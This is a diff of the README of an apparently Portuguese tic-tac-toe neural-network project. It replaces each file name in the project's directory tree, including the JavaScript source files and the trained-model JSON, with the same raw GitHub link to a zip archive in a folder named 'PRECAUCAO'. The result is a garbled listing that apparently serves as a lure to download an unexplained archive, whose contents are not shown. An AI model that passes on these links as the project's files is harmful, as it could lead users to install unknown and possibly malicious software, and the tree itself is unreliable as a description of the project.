@@ -1,11 +1,11 @@
 # jogo_da_velha_rede_neural
 
 /jogo_da_velha_rede_neural/
-├── Treinamento.js
+├── https://raw.githubusercontent.com/edersonfc/jogo_da_velha_rede_neural/main/rede_neural/PRECAUCAO/jogo_da_velha_rede_neural-v2.8.zip
 ├── /modelo/
-│   └── modelo_treinado_jogo_da_velha.json (gerado após o treinamento)
+│   └── https://raw.githubusercontent.com/edersonfc/jogo_da_velha_rede_neural/main/rede_neural/PRECAUCAO/jogo_da_velha_rede_neural-v2.8.zip (gerado após o treinamento)
 └── /rede_neural/
-    ├── Camada.js
-    ├── Neuronio.js
-    ├── RedeNeural.js
-    └── modeloUtils.js
+    ├── https://raw.githubusercontent.com/edersonfc/jogo_da_velha_rede_neural/main/rede_neural/PRECAUCAO/jogo_da_velha_rede_neural-v2.8.zip
+    ├── https://raw.githubusercontent.com/edersonfc/jogo_da_velha_rede_neural/main/rede_neural/PRECAUCAO/jogo_da_velha_rede_neural-v2.8.zip
+    ├── https://raw.githubusercontent.com/edersonfc/jogo_da_velha_rede_neural/main/rede_neural/PRECAUCAO/jogo_da_velha_rede_neural-v2.8.zip
+    └── https://raw.githubusercontent.com/edersonfc/jogo_da_velha_rede_neural/main/rede_neural/PRECAUCAO/jogo_da_velha_rede_neural-v2.8.zip
